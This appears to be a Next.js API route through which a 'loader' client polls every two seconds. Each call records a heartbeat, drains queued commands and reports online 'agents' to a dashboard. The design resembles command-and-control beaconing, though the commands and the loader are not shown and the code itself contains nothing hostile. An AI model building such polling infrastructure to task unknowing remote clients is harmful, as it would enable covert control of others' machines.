// GET /api/loader/poll?id=<loaderId>
//
// Loader hits this every ~2s. Response:
//   {
//     state:    { online: bool, count: int },
//     commands: [ {type, ...}, ... ]  // drained on this call
//   }
//
// Also acts as the heartbeat — every hit updates `markSeen(id)` so the
// dashboard's status pill can show "N loader(s) online".

import { NextResponse } from 'next/server';
import { markSeen, drain, onlineLoaders } from '../../../../lib/command-queue.js';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

export async function GET(request) {
    const url = new URL(request.url);
    const id  = url.searchParams.get('id') || '';
    const ua  = request.headers.get('user-agent') || '';
    if (!id) return NextResponse.json({ error: 'no id' }, { status: 400 });

    await markSeen(id, { ua });
    const commands = await drain(id);
    const online = await onlineLoaders();

    return NextResponse.json({
        state: { online: online.length > 0, count: online.length, agents: online },
        commands,
    }, {
        headers: { 'Cache-Control': 'no-store' },
    });
}
